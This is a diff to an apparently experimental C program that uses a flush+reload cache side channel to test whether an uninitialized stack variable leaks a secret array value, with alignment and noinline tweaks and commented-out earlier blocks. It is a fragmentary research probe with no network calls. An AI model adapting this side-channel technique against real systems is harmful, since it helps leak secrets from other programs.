@@ -19,15 +19,16 @@
 
 cp_t* flush_reload_arr;
 
-void init_func(int val) {
-    volatile char x = val;
+__attribute__((noinline)) void init_func(int val) {
+    volatile char __attribute__ ((aligned (256))) x = val;
     printf("init  \t%p:\t%d\n", &x, x);
 }
 
-void uninit_func() {
-    volatile char x;
+__attribute__((noinline)) void uninit_func(int val) {
+    volatile char __attribute__ ((aligned (256))) x;
     volatile cp_t cp = flush_reload_arr[x];
     printf("uninit\t%p:\t%d\n", &x, x);
+    //volatile int cpy = val;
 }
 
 static inline void victim_func() {
@@ -36,12 +37,12 @@ static inline void victim_func() {
     flush((void*)&val);
     cpuid();
     init_func(val);
-    uninit_func();
+    uninit_func(0);
 
 }
 
 void touch_secret(int secret_index) {
-    volatile char s = SECRET[secret_index];
+    volatile char __attribute__ ((aligned (256))) s = SECRET[secret_index];
     printf("secret\t%p:\t%d\n", &s, s);
 }
 
@@ -50,6 +51,7 @@ int* prepare(int secret_index) {
     flush_reload_arr = init_flush_reload(N_PAGES);
     flush_arr((void*)flush_reload_arr, N_PAGES);
     cpuid();
+    int val = 5;
 
     //NO IDEA WHY I NEED THIS
     int n_accesses = 1;
@@ -57,31 +59,33 @@ int* prepare(int secret_index) {
     //END OF WEIRD SECTION
 
     //TOUCH SECRET START
-    //touch_secret(secret_index);
-    if(secret_index <= SECRET_SIZE) {   //IF TRUE
+    touch_secret(secret_index);
+    /*if(secret_index <= SECRET_SIZE) {   //IF TRUE
         volatile char s = SECRET[secret_index];
         printf("secret\t%p:\t%d\n", &s, s);
-    }
+    }//*/
  
     //TOUCH SECRET END
     cpuid();
 
     //VICTIM FUNC START
-    int val = 5;
 
     flush((void*)&val);
     cpuid();
-    if(secret_index <= SECRET_SIZE) {   //IF TRUE
-        //init_func(val);
+    init_func(val);
+    uninit_func(0);//*/
+
+    /*if(secret_index <= SECRET_SIZE) {   //IF TRUE
+
         volatile char x = val;
         printf("init  \t%p:\t%d\n", &x, x);
     }
+
     if(secret_index <= SECRET_SIZE) {   //IF TRUE
-        //uninit_func();
         volatile char x;
         volatile cp_t cp = flush_reload_arr[x];
         printf("uninit\t%p:\t%d\n", &x, x);
-    }
+    }//*/
     
     //VICTIM FUNC END
     cpuid();
